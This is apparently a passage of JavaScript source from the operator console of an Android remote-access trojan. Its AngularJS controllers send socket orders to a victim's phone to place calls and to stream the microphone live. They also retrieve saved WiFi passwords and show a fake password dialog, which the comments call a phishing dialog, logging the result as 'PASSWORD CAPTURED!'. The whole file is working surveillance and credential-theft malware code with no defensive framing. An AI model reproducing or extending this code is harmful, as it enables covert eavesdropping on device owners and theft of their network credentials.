        $rootScope.Log(`[→] Initiating call to ${$MakeCallCtrl.phoneNumber}...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: makeCall, phoneNumber: $MakeCallCtrl.phoneNumber });
        
        // Add to history
        $MakeCallCtrl.callHistory.unshift({
            number: $MakeCallCtrl.phoneNumber,
            time: new Date().toLocaleTimeString()
        });
        
        if ($MakeCallCtrl.callHistory.length > 10) {
            $MakeCallCtrl.callHistory.pop();
        }
    };

    socket.on(makeCall, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] Call initiated to ${data.phoneNumber}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log(`[✗] Failed to make call: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $MakeCallCtrl.$apply();
    });
});

//-----------------------Live Mic Controller------------------------
app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
    $LiveMicCtrl = $scope;
    $LiveMicCtrl.isStreaming = false;
    $LiveMicCtrl.streamDuration = '00:00:00';
    $LiveMicCtrl.audioChunks = 0;
    
    var liveMic = CONSTANTS.orders.liveMic || 'x0000lm2';
    var streamTimer = null;
    var startTime = null;
    var audioContext = null;

    $LiveMicCtrl.$on('$destroy', () => {
        socket.removeAllListeners(liveMic);
        if (streamTimer) $interval.cancel(streamTimer);
        if (audioContext) audioContext.close();
    });

    $LiveMicCtrl.startStream = () => {
        $LiveMicCtrl.isStreaming = true;
        $LiveMicCtrl.audioChunks = 0;
        startTime = Date.now();
        
        $rootScope.Log('[→] Starting live microphone stream...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: liveMic, action: 'start' });
        
        // Update duration timer
        streamTimer = $interval(() => {
            var elapsed = Math.floor((Date.now() - startTime) / 1000);
            var hours = Math.floor(elapsed / 3600);
            var minutes = Math.floor((elapsed % 3600) / 60);
            var seconds = elapsed % 60;
            $LiveMicCtrl.streamDuration = 
                String(hours).padStart(2, '0') + ':' +
                String(minutes).padStart(2, '0') + ':' +
                String(seconds).padStart(2, '0');
        }, 1000);
    };

    $LiveMicCtrl.stopStream = () => {
        $LiveMicCtrl.isStreaming = false;
        
        $rootScope.Log('[→] Stopping microphone stream...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: liveMic, action: 'stop' });
        
        if (streamTimer) {
            $interval.cancel(streamTimer);
            streamTimer = null;
        }
    };

    socket.on(liveMic, (data) => {
        if (data.audio) {
            $LiveMicCtrl.audioChunks++;
            // Audio playback would go here
            // For now just count chunks
        } else if (data.started) {
            $rootScope.Log('[✓] Live microphone streaming started', CONSTANTS.logStatus.SUCCESS);
        } else if (data.stopped) {
            $rootScope.Log('[✓] Live microphone streaming stopped', CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $rootScope.Log(`[✗] Microphone error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        
        if (!$LiveMicCtrl.$$phase) {
            $LiveMicCtrl.$apply();
        }
    });
});

//-----------------------WiFi Passwords Controller------------------------
app.controller("WiFiPasswordsCtrl", function ($scope, $rootScope) {
    $WiFiPwdCtrl = $scope;
    $WiFiPwdCtrl.wifiNetworks = [];
    $WiFiPwdCtrl.isLoading = false;
    $WiFiPwdCtrl.error = null;
    $WiFiPwdCtrl.capturedPassword = null;
    
    var wifiPasswords = CONSTANTS.orders.wifiPasswords || 'x0000wp';

    $WiFiPwdCtrl.$on('$destroy', () => {
        socket.removeAllListeners(wifiPasswords);
    });

    // Show phishing dialog to capture WiFi password
    $WiFiPwdCtrl.promptWifiPassword = () => {
        $rootScope.Log('[→] Showing WiFi password prompt on device...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifiPasswords, extra: 'prompt' });
    };

    $WiFiPwdCtrl.getWifiPasswords = () => {
        $WiFiPwdCtrl.isLoading = true;
        $WiFiPwdCtrl.error = null;
        $WiFiPwdCtrl.wifiNetworks = [];
        
        $rootScope.Log('[→] Retrieving WiFi passwords...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifiPasswords });
    };

    $WiFiPwdCtrl.copyPassword = (password) => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(password).then(() => {
                $rootScope.Log('[✓] Password copied to clipboard', CONSTANTS.logStatus.SUCCESS);
            });
        }
    };

    socket.on(wifiPasswords, (data) => {
        $WiFiPwdCtrl.isLoading = false;
        
        // Check if this is a captured password from phishing dialog
        if (data.password && data.ssid) {
            $WiFiPwdCtrl.capturedPassword = {
                ssid: data.ssid,
                password: data.password
            };
            $rootScope.Log(`[✓] PASSWORD CAPTURED! SSID: ${data.ssid}, Password: ${data.password}`, CONSTANTS.logStatus.SUCCESS);
            
            // Also add to networks list
            $WiFiPwdCtrl.wifiNetworks.unshift({
                ssid: data.ssid,
                password: data.password,
                security: 'Captured',
                showPassword: true
            });
        } else if (data.message && data.instruction) {
            // Prompt shown confirmation
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $WiFiPwdCtrl.error = {
                title: 'Failed to retrieve passwords',
                message: data.error
            };
            $rootScope.Log(`[✗] WiFi passwords error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        } else if (data.networks) {
            $WiFiPwdCtrl.wifiNetworks = data.networks.map(n => ({ ...n, showPassword: false }));
            $rootScope.Log(`[✓] Found ${data.networks.length} saved WiFi networks`, CONSTANTS.logStatus.SUCCESS);
            
            if (data.note) {
                $rootScope.Log(`[!] ${data.note}`, CONSTANTS.logStatus.WARN);
            }
        }
        
        $WiFiPwdCtrl.$apply();
    });
});
